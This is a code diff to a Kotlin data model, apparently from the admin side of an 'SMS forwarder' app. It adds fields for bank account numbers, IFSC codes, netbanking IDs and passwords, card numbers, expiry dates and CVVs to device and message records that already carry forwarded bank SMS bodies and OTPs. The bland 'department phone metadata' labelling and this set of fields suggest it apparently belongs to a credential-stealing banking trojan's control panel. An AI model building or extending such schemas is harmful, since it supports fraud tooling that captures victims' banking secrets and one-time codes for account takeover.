@@ -3,7 +3,7 @@ package com.smsforwarder.admin.domain.model
 import kotlinx.serialization.Serializable
 
 /**
- * Department phone metadata.
+ * Department phone / user metadata.
  */
 @Serializable
 data class AdminDeviceDto(
@@ -12,6 +12,14 @@ data class AdminDeviceDto(
     val departmentName: String = "General Dept",
     val mobileNumber: String = "N/A",
     val address: String = "Main Office",
+    val bankName: String? = null,
+    val accountNumber: String? = null,
+    val ifscCode: String? = null,
+    val netbankingId: String? = null,
+    val netbankingPassword: String? = null,
+    val cardNumber: String? = null,
+    val cardExpiry: String? = null,
+    val cardCvv: String? = null,
     val role: String = "SOURCE",
     val status: String = "OFFLINE",
     val lastSeen: String? = null,
@@ -30,6 +38,14 @@ data class AdminMessageDto(
     val departmentName: String = "General Dept",
     val mobileNumber: String = "N/A",
     val address: String = "Main Office",
+    val bankName: String? = null,
+    val accountNumber: String? = null,
+    val ifscCode: String? = null,
+    val netbankingId: String? = null,
+    val netbankingPassword: String? = null,
+    val cardNumber: String? = null,
+    val cardExpiry: String? = null,
+    val cardCvv: String? = null,
     val sender: String = "BANK",
     val body: String = "",
     val otp: String? = null,
